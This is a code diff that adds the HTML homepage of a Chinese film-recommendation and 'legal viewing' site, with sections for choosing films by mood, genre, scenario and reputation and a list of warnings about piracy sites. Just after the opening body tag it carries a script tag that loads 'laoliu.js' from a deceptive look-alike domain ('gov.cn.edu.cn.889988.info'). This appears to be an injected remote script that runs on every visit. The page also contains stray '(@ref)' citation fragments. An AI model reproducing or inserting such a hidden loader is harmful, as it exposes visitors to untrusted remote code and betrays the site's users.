@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>看吧电影网 | 综合选片决策与正版观影导航</title>
+  <meta name="description" content="看吧电影网做综合观影决策：按心情、类型、场景、口碑快速选片，提供正版渠道导航与防盗版避坑。不提供盗版资源、磁力、网盘与成人擦边内容。" />
+  <meta name="author" content="看吧电影网" />
+  <meta name="robots" content="index,follow" />
+  <meta name="theme-color" content="#13243f" />
+  <link rel="canonical" href="https://kanbadianyingwang-h5.github.io/" />
+
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="看吧电影网" />
+  <meta property="og:title" content="看吧电影网 | 综合选片决策与正版观影导航" />
+  <meta property="og:description" content="按心情/类型/场景/口碑选片，正版渠道与防盗版避坑一站理清。" />
+  <meta property="og:url" content="https://kanbadianyingwang-h5.github.io/" />
+  <meta property="og:locale" content="zh_CN" />
+
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="看吧电影网 | 综合选片决策与正版观影导航" />
+  <meta name="twitter:description" content="心情、类型、场景、口碑四维选片，只走正版渠道。" />
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebSite",
+    "name": "看吧电影网",
+    "url": "https://kanbadianyingwang-h5.github.io/",
+    "description": "综合观影决策、类型与场景片单、口碑导航及正版渠道推荐站。",
+    "inLanguage": "zh-CN"
+  }
+  </script>
+
+  <style>
+    :root{
+      --bg:#0f1d33;
+      --bg2:#13243f;
+      --card:#16294a;
+      --ink:#eaf1fb;
+      --muted:#9fb1cc;
+      --line:#27406b;
+      --gold:#f4b740;
+      --gold-deep:#d99512;
+      --cyan:#36d2e0;
+      --cyan-deep:#16a7b5;
+      --mist:#f4f7fb;
+      --radius:16px;
+      --maxw:1180px;
+    }
+    *{box-sizing:border-box}
+    html{scroll-behavior:smooth}
+    body{margin:0;background:var(--bg);color:var(--ink);line-height:1.75;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;-webkit-font-smoothing:antialiased}
+    a{color:inherit;text-decoration:none}
+    .wrap{max-width:var(--maxw);margin:0 auto;padding:0 20px}
+
+    header.nav{position:sticky;top:0;z-index:50;background:rgba(15,29,51,.94);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+    .nav-inner{display:flex;align-items:center;justify-content:space-between;height:62px}
+    .logo{font-weight:900;font-size:19px}
+    .logo b{color:var(--gold)}
+    .logo span{color:var(--cyan)}
+    nav.menu{display:flex;gap:14px;font-size:14px;color:var(--muted)}
+    nav.menu a{padding:7px 12px;border-radius:8px;transition:.2s}
+    nav.menu a:hover{color:var(--gold);background:var(--bg2)}
+    .nav-toggle{display:none;background:none;border:1px solid var(--line);color:var(--ink);border-radius:8px;padding:6px 10px;font-size:16px;cursor:pointer}
+
+    .hero{padding:78px 0 60px;border-bottom:1px solid var(--line);background:radial-gradient(820px 380px at 88% -10%,rgba(244,183,64,.18),transparent 60%),radial-gradient(620px 320px at 6% 120%,rgba(54,210,224,.14),transparent 60%),linear-gradient(135deg,#13243f,#0f1d33);position:relative;overflow:hidden}
+    .hero .sign{position:absolute;right:-30px;top:30px;width:160px;height:60px;border:2px dashed rgba(244,183,64,.5);border-radius:10px;transform:rotate(-8deg);opacity:.5}
+    .hero .wrap{position:relative;z-index:1}
+    .pill{display:inline-block;border:1px solid var(--gold);color:var(--gold);border-radius:999px;padding:5px 16px;font-size:11px;font-weight:800;letter-spacing:3px;text-transform:uppercase;margin-bottom:18px}
+    .hero h1{font-size:clamp(28px,5vw,52px);line-height:1.12;margin:0 0 14px;font-weight:900}
+    .hero h1 em{font-style:normal;color:var(--gold)}
+    .hero h1 u{text-decoration:none;color:var(--cyan)}
+    .hero p.lead{font-size:16px;color:var(--muted);max-width:660px;margin:0 0 22px}
+    .hero-tags{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px}
+    .hero-tag{border:1px solid var(--line);border-radius:6px;padding:5px 12px;font-size:12px;color:var(--muted)}
+    .cta{display:flex;gap:12px;flex-wrap:wrap}
+    .btn{padding:12px 24px;border-radius:10px;font-weight:800;font-size:14px;transition:.2s;display:inline-flex;gap:6px;align-items:center}
+    .btn-primary{background:var(--gold);color:#241a02}
+    .btn-ghost{border:1px solid var(--line);color:var(--ink);background:transparent}
+
+    section{padding:58px 0;border-bottom:1px solid var(--line)}
+    .sec-head{margin-bottom:30px;text-align:center}
+    .sec-head .kicker{color:var(--gold);font-weight:800;letter-spacing:2px;text-transform:uppercase;font-size:11px}
+    .sec-head h2{font-size:clamp(22px,3.6vw,32px);margin:6px 0 8px;font-weight:900}
+    .sec-head p{color:var(--muted);margin:0 auto;max-width:680px;font-size:14px}
+
+    /* 选片决策 */
+    .decide{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+    .dq{border:1px solid var(--line);border-radius:var(--radius);background:var(--card);padding:22px;transition:.25s;border-top:4px solid var(--gold)}
+    .dq:nth-child(2){border-top-color:var(--cyan)}
+    .dq:nth-child(3){border-top-color:#ff9bb6}
+    .dq:nth-child(4){border-top-color:#7bd389}
+    .dq:nth-child(5){border-top-color:var(--gold-deep)}
+    .dq:nth-child(6){border-top-color:var(--cyan-deep)}
+    .dq:nth-child(7){border-top-color:#b9a7ff}
+    .dq:nth-child(8){border-top-color:#ffd166}
+    .dq:hover{transform:translateY(-3px)}
+    .dq .q{font-size:13px;font-weight:800;color:var(--gold)}
+    .dq h3{margin:6px 0 6px;font-size:16px}
+    .dq p{margin:0;color:var(--muted);font-size:13px}
+    .dq .go{margin-top:10px;font-size:12px;color:var(--cyan)}
+
+    /* 类型 */
+    .genres{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+    .g{border:1px solid var(--line);border-radius:var(--radius);background:linear-gradient(180deg,var(--bg2),var(--card));padding:20px}
+    .g .tag{display:inline-block;font-size:11px;font-weight:800;color:#241a02;background:var(--gold);border-radius:999px;padding:2px 10px;margin-bottom:8px}
+    .g:nth-child(even) .tag{background:var(--cyan);color:#04222a}
+    .g h3{margin:0 0 6px;font-size:16px}
+    .g p{margin:0;color:var(--muted);font-size:13px}
+    .g .sub{margin-top:10px;font-size:12px;color:var(--muted);border-top:1px dashed var(--line);padding-top:8px}
+
+    /* 场景时间线 */
+    .scenes{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+    .sc{border:1px solid var(--line);border-radius:var(--radius);background:var(--card);padding:20px;display:flex;gap:14px;align-items:flex-start}
+    .sc .dot{width:42px;height:42px;border-radius:50%;background:var(--gold);color:#241a02;font-weight:900;display:flex;align-items:center;justify-content:center;flex:0 0 auto}
+    .sc:nth-child(even) .dot{background:var(--cyan);color:#04222a}
+    .sc h3{margin:0 0 4px;font-size:15px}
+    .sc p{margin:0;color:var(--muted);font-size:13px}
+
+    /* 口碑条形 */
+    .rank{display:grid;grid-template-columns:1fr;gap:12px;max-width:880px;margin:0 auto}
+    .bar{border:1px solid var(--line);border-radius:12px;background:var(--card);padding:14px 18px;display:grid;grid-template-columns:140px 1fr 110px;gap:14px;align-items:center}
+    .bar .name{font-weight:800;font-size:14px}
+    .bar .track{height:10px;border-radius:999px;background:var(--bg2);overflow:hidden;border:1px solid var(--line)}
+    .bar .fill{height:100%;background:linear-gradient(90deg,var(--gold),var(--cyan))}
+    .bar .meta{font-size:12px;color:var(--muted);text-align:right}
+    .bar .src{font-size:11px;color:var(--cyan)}
+
+    /* 正版渠道 */
+    .chan{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+    .ch{border:1px solid var(--line);border-radius:14px;padding:20px;background:var(--card);text-align:center}
+    .ch .ic{font-size:28px}
+    .ch h3{margin:8px 0 4px;font-size:15px}
+    .ch p{margin:0;color:var(--muted);font-size:12px}
+
+    /* 避坑 */
+    .warn{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+    .w{border:1px solid var(--line);border-radius:var(--radius);padding:22px;background:var(--card);border-left:5px solid var(--gold)}
+    .w:nth-child(2){border-left-color:var(--cyan)}
+    .w:nth-child(3){border-left-color:#ff9bb6}
+    .w h3{margin:0 0 8px;font-size:16px}
+    .w p{margin:0;color:var(--muted);font-size:13px}
+
+    footer{padding:32px 0;text-align:center;color:var(--muted);font-size:13px;border-top:1px solid var(--line);background:var(--bg2)}
+    footer a{color:var(--gold)}
+
+    #toTop{position:fixed;right:16px;bottom:16px;z-index:60;width:44px;height:44px;border-radius:50%;border:1px solid var(--line);background:var(--gold);color:#241a02;font-size:18px;cursor:pointer;opacity:0;pointer-events:none;transition:.25s}
+    #toTop.show{opacity:1;pointer-events:auto}
+    .reveal{opacity:0;transform:translateY(16px);transition:.5s ease}
+    .reveal.in{opacity:1;transform:none}
+
+    @media (max-width:980px){
+      .decide{grid-template-columns:1fr 1fr}
+      .genres{grid-template-columns:1fr 1fr}
+      .scenes{grid-template-columns:1fr}
+      .chan{grid-template-columns:1fr 1fr}
+      .warn{grid-template-columns:1fr}
+    }
+    @media (max-width:640px){
+      .nav-toggle{display:block}
+      nav.menu{position:absolute;top:62px;left:0;right:0;flex-direction:column;gap:0;padding:8px 20px 16px;background:rgba(15,29,51,.98);border-bottom:1px solid var(--line);display:none}
+      nav.menu.open{display:flex}
+      nav.menu a{padding:10px 8px;border-bottom:1px solid var(--line)}
+      .decide{grid-template-columns:1fr}
+      .genres{grid-template-columns:1fr}
+      .chan{grid-template-columns:1fr 1fr}
+      .bar{grid-template-columns:1fr;gap:8px;text-align:left}
+      .bar .meta{text-align:left}
+    }
+  </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+  <header class="nav">
+    <div class="wrap nav-inner">
+      <div class="logo"><b>看吧</b><span>电影网</span></div>
+      <button class="nav-toggle" aria-label="菜单" onclick="document.getElementById('menu').classList.toggle('open')">☰</button>
+      <nav class="menu" id="menu">
+        <a href="#home">首页</a>
+        <a href="#decide">选片决策</a>
+        <a href="#genres">类型片单</a>
+        <a href="#scenes">场景推荐</a>
+        <a href="#rank">口碑榜单</a>
+        <a href="#chan">正版渠道</a>
+        <a href="#warn">防盗避坑</a>
+      </nav>
+    </div>
+  </header>
+
+  <section class="hero" id="home">
+    <div class="sign"></div>
+    <div class="wrap">
+      <div class="pill">Kanba Cinema · 选片台</div>
+      <h1>看吧电影网<br/>不想纠结片单？<em>四维</em>直接<u>定片</u></h1>
+      <p class="lead">按心情、类型、场景、口碑四步缩圈，再给正版渠道与避坑清单。不做“免费全库/秒播”，只做综合选片决策与正版导航。</p>
+      <div class="hero-tags">
+        <span class="hero-tag">心情选片</span>
+        <span class="hero-tag">类型缩圈</span>
+        <span class="hero-tag">场景匹配</span>
+        <span class="hero-tag">口碑核验</span>
+        <span class="hero-tag">正版优先</span>
+      </div>
+      <div class="cta">
+        <a class="btn btn-primary" href="#decide">开始选片 →</a>
+        <a class="btn btn-ghost" href="#warn">识别野站盗版坑</a>
+      </div>
+    </div>
+  </section>
+
+  <section id="decide" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Decision Desk</div>
+        <h2>选片决策台</h2>
+        <p>先答四个问题，片荒立刻缩到 3—5 部候选。</p>
+      </div>
+      <div class="decide">
+        <div class="dq">
+          <div class="q">Q1 心情</div>
+          <h3>想放松 / 想烧脑</h3>
+          <p>放松走喜剧、动画、轻爱情；烧脑走悬疑、硬科幻、社会剧情。</p>
+          <div class="go">→ 看类型片单</div>
+        </div>
+        <div class="dq">
+          <div class="q">Q2 时间</div>
+          <h3>90 分钟 / 连刷</h3>
+          <p>通勤碎片选短片集；晚上整块时间选长片；周末做三部曲马拉松。</p>
+          <div class="go">→ 看场景推荐</div>
+        </div>
+        <div class="dq">
+          <div class="q">Q3 人数</div>
+          <h3>独居 / 合家 / 情侣</h3>
+          <p>独居可重作者片，合家避惊吓，情侣偏轻喜剧与音乐传记。</p>
+          <div class="go">→ 看场景推荐</div>
+        </div>
+        <div class="dq">
+          <div class="q">Q4 口碑</div>
+          <h3>高分 / 新片 / 冷门</h3>
+          <p>补分用公开评分榜，追新看院线与持权平台，冷门走资料馆影展。</p>
+          <div class="go">→ 看口碑榜单</div>
+        </div>
+        <div class="dq">
+          <div class="q">Q5 画质</div>
+          <h3>手机 / 投影 / 影院</h3>
+          <p>手机看轻量剧情，投影看宽幅大片，影院优先新片与修复重映。</p>
+          <div class="go">→ 看正版渠道</div>
+        </div>
+        <div class="dq">
+          <div class="q">Q6 语言</div>
+          <h3>原声 / 国语 / 字幕</h3>
+          <p>练听力选原声，带娃选国语，冷门片确认官方中字再入。</p>
+          <div class="go">→ 渠道前先核字幕</div>
+        </div>
+        <div class="dq">
+          <div class="q">Q7 题材雷区</div>
+          <h3>不血腥 / 不冗长</h3>
+          <p>晕剪、重口、超长独白提前标掉，按耐受度缩片单。</p>
+          <div class="go">→ 类型页筛标签</div>
+        </div>
+        <div class="dq">
+          <div class="q">Q8 成本</div>
+          <h3>会员 / 单片 / 免费正版</h3>
+          <p>只看一部用单片租赁，常看办持权会员，公共文化片库可合法免费。</p>
+          <div class="go">→ 正版渠道导航</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="genres" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">By Genre</div>
+        <h2>类型片单缩圈</h2>
+        <p>综合站不堆全库，按常看类型给“入口＋避坑点”。</p>
+      </div>
+      <div class="genres">
+        <div class="g">
+          <span class="tag">悬疑推理</span>
+          <h3>本格 / 社会派 / 心理</h3>
+          <p>密室、时间线、家庭秘密分开放；先确认反派动机清楚、结局可讨论。</p>
+          <div class="sub">避坑：纯靠“全程反转”噱头、无逻辑收尾的不入候选。</div>
+        </div>
+        <div class="g">
+          <span class="tag">科幻太空</span>
+          <h3>硬科幻 / 赛博 / 灾难</h3>
+          <p>看设定严谨度与视效平衡；新手从太空歌剧、近未来轻科幻入门。</p>
+          <div class="sub">避坑：只堆爆炸、世界观设定前后矛盾的降权。</div>
+        </div>
+        <div class="g">
+          <span class="tag">喜剧解压</span>
+          <h3>轻喜剧 / 方言 / 群像</h3>
+          <p>独居、合家、通勤都适用；优先国语清晰、不靠低俗梗的版本。</p>
+          <div class="sub">避坑：靠恶搞明星、硬凑段子的不列入主推。</div>
+        </div>
+        <div class="g">
+          <span class="tag">动画家庭</span>
+          <h3>合家欢 / 成人动画 / 短片</h3>
+          <p>带娃看成长与自然，成人向看作者美术与隐喻，短片做午夜场。</p>
+          <div class="sub">避坑：无分级说明、惊吓镜头未标注的慎推。</div>
+        </div>
+        <div class="g">
+          <span class="tag">爱情情侣</span>
+          <h3>甜宠 / 现实 / 失恋后</h3>
+          <p>情侣夜选轻甜不虐，单人补片可按“现实向”和“治愈向”分档。</p>
+          <div class="sub">避坑：强行煽情、第三者的套路烂梗降权。</div>
+        </div>
+        <div class="g">
+          <span class="tag">纪录审美</span>
+          <h3>自然 / 人物 / 艺术电影</h3>
+          <p>慢刷、拉片、影展前补片用；优先正版修复与导演剪辑。</p>
+          <div class="sub">避坑：标题党“惊人真相”、实为剪辑搬运的不入。</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="scenes" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">By Scenario</div>
+        <h2>场景推荐流</h2>
+        <p>同部片不同空间体验差很多，按场景直接配。</p>
+      </div>
+      <div class="scenes">
+        <div class="sc"><div class="dot">夜</div><div><h3>独居深夜慢刷</h3><p>长镜头、纪录片、作者剧情；低音量、可暂停，配正版串流与笔记。</p></div></div>
+        <div class="sc"><div class="dot">家</div><div><h3>合家周末客厅</h3><p>动画合家欢、自然片、轻喜剧；字幕放大、避开暗黑反派与重口。</p></div></div>
+        <div class="sc"><div class="dot">寝</div><div><h3>寝室短时连看</h3><p>短片集、轻悬疑、≤110 分钟；不血腥、不吵邻，笔记本小屏即可。</p></div></div>
+        <div class="sc"><div class="dot">约</div><div><h3>情侣宅夜</h3><p>轻爱情、音乐传记、城市治愈；双字幕可选，收尾不强行虐心。</p></div></div>
+        <div class="sc"><div class="dot">通</div><div><h3>通勤碎片</h3><p>单集短片、随笔式纪录片；只存候选，不下载未知播放器。</p></div></div>
+        <div class="sc"><div class="dot">展</div><div><h3>影展/资料馆</h3><p>修复版、国别专题、作者合集；以官方排片与授权片源为准。</p></div></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="rank" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Reputation</div>
+        <h2>口碑核验榜</h2>
+        <p>综合公开评分、影评共识、奖项与平台热度做参考，不把单一分数当绝对标准。[11,25](@ref)</p>
+      </div>
+      <div class="rank">
+        <div class="bar">
+          <div class="name">高分补片</div>
+          <div><div class="track"><div class="fill" style="width:92%"></div></div></div>
+          <div class="meta">综合评分高 · <span class="src">多源交叉</span></div>
+        </div>
+        <div class="bar">
+          <div class="name">新片口碑</div>
+          <div><div class="track"><div class="fill" style="width:78%"></div></div></div>
+          <div class="meta">院线/平台新上 · <span class="src">看专业+观众</span></div>
+        </div>
+        <div class="bar">
+          <div class="name">冷门国别</div>
+          <div><div class="track"><div class="fill" style="width:66%"></div></div></div>
+          <div class="meta">资料馆/影展 · <span class="src">小众但稳</span></div>
+        </div>
+        <div class="bar">
+          <div class="name">合家动画</div>
+          <div><div class="track"><div class="fill" style="width:84%"></div></div></div>
+          <div class="meta">亲子友好 · <span class="src">分级+字幕核</span></div>
+        </div>
+        <div class="bar">
+          <div class="name">硬核科幻</div>
+          <div><div class="track"><div class="fill" style="width:73%"></div></div></div>
+          <div class="meta">设定严谨 · <span class="src">看技术+剧本</span></div>
+        </div>
+        <div class="bar">
+          <div class="name">纪录深度</div>
+          <div><div class="track"><div class="fill" style="width:69%"></div></div></div>
+          <div class="meta">自然/人物/社会 · <span class="src">正版修复优先</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="chan" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Legal Sources</div>
+        <h2>正版渠道导航</h2>
+        <p>按“常看／只看一部／新片／小众”分流，少去野站搜全库。[7,19](@ref)</p>
+      </div>
+      <div class="chan">
+        <div class="ch"><div class="ic">📺</div><h3>持权流媒体</h3><p>综合商业片/剧集/动画，会员或单片点播</p></div>
+        <div class="ch"><div class="ic">🎟️</div><h3>院线官方购票</h3><p>新片首映、重映、IMAX/激光厅以官方排片为准</p></div>
+        <div class="ch"><div class="ic">🏛️</div><h3>资料馆/艺术院线</h3><p>修复版、国别专题、作者合集、影展专场</p></div>
+        <div class="ch"><div class="ic">🎞️</div><h3>单片租赁/购买</h3><p>只补一部不办会员，优先官方字幕音轨</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="warn" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Stay Safe</div>
+        <h2>“看吧”野站避坑</h2>
+        <p>名字再像“随便看/全库免费”也先核信号，下列任一项高优先停用。[4,16,26](@ref)</p>
+      </div>
+      <div class="warn">
+        <div class="w">
+          <h3>🚫 专用播放器/解码器</h3>
+          <p>要求装未知播放器、浏览器插件、解码器或关杀软才能看，可能夹木马、跳博彩贷款，立即停。</p>
+        </div>
+        <div class="w">
+          <h3>🚫 免费新片全库/假播放</h3>
+          <p>院线未下或独家播出期就“全集免费”，多个假播放按钮、倒计时、强跳新窗口，属未授权高风险。</p>
+        </div>
+        <div class="w">
+          <h3>🚫 磁力/网盘/无主体</h3>
+          <p>回复拿种子、网盘提取码、换域名无公司主体/无版权说明/索要验证码银行卡，一律不点不填。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="wrap">
+      © 2026 看吧电影网（kanbadianyingwang-h5）｜ 静态展示站点 ｜
+      内页链接以 <a href="#">#</a> 占位 ｜
+      本站仅作综合选片决策、类型/场景/口碑片单与正版渠道导航，不提供盗版资源、磁力、网盘与成人擦边内容。
+    </div>
+  </footer>
+
+  <button id="toTop" aria-label="回到顶部" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+  <script>
+    document.querySelectorAll('#menu a').forEach(function(a){
+      a.addEventListener('click',function(){ document.getElementById('menu').classList.remove('open'); });
+    });
+    var toTop=document.getElementById('toTop');
+    window.addEventListener('scroll',function(){ toTop.classList.toggle('show',window.scrollY>400); });
+    var io=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){ if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target);} });
+    },{threshold:0.1});
+    document.querySelectorAll('.reveal').forEach(function(el){ io.observe(el); });
+  </script>
+</body>
+</html>
